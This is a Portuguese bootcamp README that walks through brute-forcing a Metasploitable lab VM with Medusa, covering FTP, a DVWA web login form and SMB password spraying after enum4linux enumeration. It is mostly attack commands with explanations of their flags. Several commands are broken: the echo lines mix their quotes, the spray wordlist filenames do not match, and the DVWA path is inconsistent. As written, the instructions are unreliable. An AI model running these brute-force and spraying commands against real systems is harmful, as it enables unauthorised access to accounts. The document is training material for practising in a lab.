# Bruteforce-Medusa
Projeto de bruteforce com a ferramenta medusa no kali linux, tendo como alvo o metaspoitable.

PROJETO DE BRUTEFORCE - WEBSECURITY - DIO - SANTANDER BOOTCAMP

#BRUTE FORCE EM FTP COM MEDUSA

No terminal do Kali Linux

PING 3 "ip" (ip encontrado através do comando ip a no metaspoitable) isso nos mostrará se as maquinas estão na mesma rede, configuração que fizemos no VB através de bridge

nmap -sv -p 21,22,80,445,139 "IP ALVO" (isto irá verificar as portas que são o primeiro grupo de números, identificando se está aberta ou não para um possível ataque)

ftp "IP ALVO" (aqui nós iremos verificar se o ftp está aceitando conexões, porem irá pedir log e senha)

*Agora iremos criar duas listas com possíveis usuarios e senhas:

echo -e "user\nmsfadmin\nadmin\nroot' > users.txt"
echo -e "user\nmsfadmin\nadmin\nroot' > pass.txt"
(estes comandos irão criar listas com possíveis nomes e senhas que será utilizado para testarmos e descobrirmos a senha do alvo através do medusa)

medusa -h "IP ALVO" -U users.txt -P pass.txt -M ftp -t 6
(-U para identificar usuários, -P para identificar senhas, -M para identificar o protocolo, -T para usar threads simultâneas)

#APÓS ESTE PROCESSO VOCÊ JÁ TERÁ IDENTIFICADO LOG E SENHA, BASTA USAR FTP "IP ALVO" novamente


#BRUTE FORCE EM FORMULÁRIO WEB COM MEDUSA

*Para isso começaremos lá no Mozilla Firefox ainda no kali Linux
Conecte em: "IP ALVO"/dva/login.php

Abra o terminal de dev através do F12 OU FN+F12 > Network 
(Network mostrará toda a atividade da página)

*Agora iremos criar um Wordlist!

echo -e "user\nmsfadmin\nadmin\nroot' > users.txt"
echo -e "user\nmsfadmin\nadmin\nroot' > pass.txt"
(Mesma ideia lá de cima no ftp)

No terminal Kali linux
medusa -h "IP ALVO" -U users.txt -P pass.txt -M http \
-m PAGE:'dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=login' \
-m 'FAIL=Login failed' -t 6

(REPETINDO LÁ DE CIMA TAMBÉM, -H é o IP ALVO, -U é o arquivo os usuários, -P o arquivo com as senhas, -M é o protocolo que será atacado, -m PAGE é o caminho do local atacado, -m FORM é onde o medusa irá trocar as linhas pelas dos arquivos -U e -P, -m FAIL é oque indicará quando o medusa terá sucesso no caso enquanto aparecer Login failed o programa não irá parar, -t é o quanto de threads usaremos para rodar o ataque)

com isto retornará User e password

#ATAQUES EM CADEIA: ENUMERAÇÃO SMB E PASSWORD SPRAYING

(SMB = SERVER MESSAGE BLOCK | protocolo Microsoft utilizado para compartilhar pastas, arquivos, impressoras, autenticação de usuário e comunicação entre maquinas Windows e Linux via SAMBA)
(Password Spraying | Testa uma senha para vários usuários, assim não bloqueando as tentativas)

*No terminal kali
enum4linux -a "IP ALVO" | tee enum4_output.txt

(enum4linux é a ferramenta principal que é usada para enumeração de sistemas Windows e Samba Linux, -a ativa todas as técnicas de enumeração em seguida o "IP ALVO", | tee serve para guardar a saída do comando em um arquivo chamado enum4_output.txt)

less enum4_output.txt
(com isso encurtaremos o resultado da ferramenta e poderemos encontrar vulnerabilidades como usuários)

*Agora com as informações do enum4 criaremos uma lista de usuários com os nomes encontrados

echo -e "user\nmsfadmin\nservice" > smb_users.txt
(este comando irá alimentar os ataques)
echo -e "password\n123456\nWelcome123\nmsfadmin" > senha spray.txt
(oque está entre "" são as senhas que escolhemos e que irá ser testadas,seguidas de n)

medusa -h "IP ALVO" -U smb_users.txt -P senhas spray.txt -M smbnt -t 2 -T 50
(-t é os threads usados e -T significa até 50 hosts em paralelo, demais modulações já vimos lá em cima)

*Validando a conexão

smbclient -L //192.168.56.101 -U msfadmin (no caso msfadmin é o usuário encontrado, digitando a senha do susuario encontrado na enumeração via medusa, você já terá acesso!)

*Conclusão

Medusa é uma ferramenta simples que é usada para quebrar senhas simples.
E para soluções mais sofisticadas técnicas com IA e automação.

